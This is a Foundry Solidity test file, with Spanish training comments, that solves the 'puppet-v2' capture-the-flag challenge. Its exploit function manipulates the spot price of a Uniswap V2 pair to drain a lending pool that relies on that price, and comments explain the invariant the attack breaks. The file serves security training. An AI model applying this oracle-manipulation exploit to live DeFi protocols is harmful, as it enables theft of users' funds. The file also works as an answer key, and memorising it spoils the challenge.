// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

/*
 * NEXUS Offensive · training/dvd · reto "puppet-v2"
 *
 * CLASE DE BUG: manipulación de oráculo de precio (spot de Uniswap V2). El pool
 *   valúa el colateral con las reservas spot del par WETH/DVT. El atacante
 *   vuelca sus DVT en el par, hunde el precio del DVT, y así el WETH exigido
 *   para pedir prestado todo el pool cae de ~300k a ~30 → saca 1M de tokens.
 *
 * FAMILIA: Oráculo / Precio (misma que puppet, ahora con Uniswap V2).
 *
 * INVARIANTE QUE LO ATRAPA (reusa O1):
 *   El colateral exigido debe medirse con un precio resistente a manipulación.
 *   Se sostiene al inicio (refleja el precio justo) y se rompe tras volcar
 *   tokens en el par (el colateral exigido se desploma).
 */
contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        token = new DamnValuableToken();
        weth = new WETH();

        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
    }

    function test_puppet_v2() public checkSolvedByPlayer {
        // INV O1 al inicio: el colateral exigido refleja el precio justo.
        uint256 fairPerToken = lendingPool.calculateDepositOfWETHRequired(1e18);
        console.log("colateral WETH exigido por 1 token (inicial):", fairPerToken);

        // EXPLOIT: volcar todos los DVT del player en el par → hunde el precio.
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp);

        // INV rota: el colateral exigido se desploma por la manipulación del spot.
        uint256 manipPerToken = lendingPool.calculateDepositOfWETHRequired(1e18);
        console.log("colateral WETH exigido por 1 token (manip):", manipPerToken);
        assertLt(manipPerToken * 10, fairPerToken, "O1 rota: colateral << valor justo");

        // Juntar WETH (lo del swap + envolver el ETH del player) y pedir todo el pool.
        weth.deposit{value: player.balance}();
        uint256 required = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), required);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        // Rescatar al recovery.
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
